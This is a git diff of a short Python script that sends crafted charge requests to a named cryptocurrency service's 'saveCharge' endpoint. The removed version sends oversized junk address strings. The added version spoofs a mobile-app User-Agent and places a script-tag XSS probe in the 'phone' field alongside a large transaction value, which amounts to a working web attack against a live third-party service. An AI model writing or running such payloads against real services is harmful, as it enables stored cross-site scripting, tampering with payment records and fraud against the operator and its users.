@@ -75,32 +75,21 @@ log = logging.getLogger('log')
 # -H 'Proxy-Connection: keep-alive'
 # -H 'X-DevTools-Request-Id: 21152.153'
 def doPost():
-    url = 'http://www.gitium.io/gitium/charge/saveCharge'
-    body = {
-        "receivedAddress": "9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEAAAAADDDDDDSFADFSFADFASFSFADSFASDFADSFAAAAAAAABBBB",
-        "currency": "GIT",
-        "value": 1312852829198,
-        "status": "0",
-        "phone": "",
-        "chargeValue": 1,
-        "useCurrency": "Bitcoin",
-        "chargeAddress": "9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEAAAAADDDDDDSFADFSFADFASFSFADSFASDFADSFAAAAAAAABBBB",
-        "userPayAddress": "9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEVYU9ZZCY9LRWOWHLJACQSYKEY9EKTG9RKOLX9SFZLQPWMLLPALJCTBBCLFQQKEGMY9QMWBHRSVEATKGNBFI9CKUOSEAAAAADDDDDDSFADFSFADFASFSFADSFASDFADSFAAAAAAAABBBB"
-    }
-    # body = body.encode(encoding="utf-8")
     headers = {
-        'Origin': "file://",
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json',
+        'x-iota-api-version': '1',
+        # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) gitium/2.1.3 Chrome/59.0.3071.115 Electron/1.8.2 Safari/537.36',
+        'User-Agent': 'gitium-rn/1 CFNetwork/974.2.1 Darwein/18.0.0',
+        'AcceptLanguage': 'zh-cn',
         'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': "zh-CN",
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) gitium/2.1.3 Chrome/59.0.3071.115 Electron/1.8.2 Safari/537.36",
-        'Content-Type': "application/json;charset=UTF-8",
-        'Accept': "application/json, text/plain, */*' -H 'X-IOTA-API-Version: 1",
-        'Proxy-Connection': "keep-alive",
-        'X-DevTools-Request-Id': '21152.396'
     }
+    base_url = 'http://www.gitium.io/gitium/charge/saveCharge'
+    pay_load = {"receivedAddress":"SDIPOLOPSQMKUYODGICMEWHNVNKXIAUDNMJLOBQQWAGRTBBKEJCZJMG9GEOMDKAGVBLJHHVRCDTXBSTMX","currency":"GIT","value":1310787783458,"status":"0","phone":"<script>alert('H');</script>","chargeValue":9,"useCurrency":"Bitcoin","chargeAddress":"SDIPOLOPSQMKUYODGICMEWHNVNKXIAUDNMJLOBQQWAGRTBBKEJCZJMG9GEOMDKAGVBLJHHVRCDTXBSTMX","userPayAddress":"SDIPOLOPSQMKUYODGICMEWHNVNKXIAUDNMJLOBQQWAGRTBBKEJCZJMG9GEOMDKAGVBLJHHVRCDTXBSTMX"}
+    # payload = {"command":"getNodeInfo"}
+    resp = requests.post(base_url, data=json.dumps(pay_load), headers=headers)
+    log.info(resp.text)
 
-    response = requests.post(url, data=json.dumps(body), headers=headers)
-    log.info(response.text)
 
 
 def runLogic(arg):
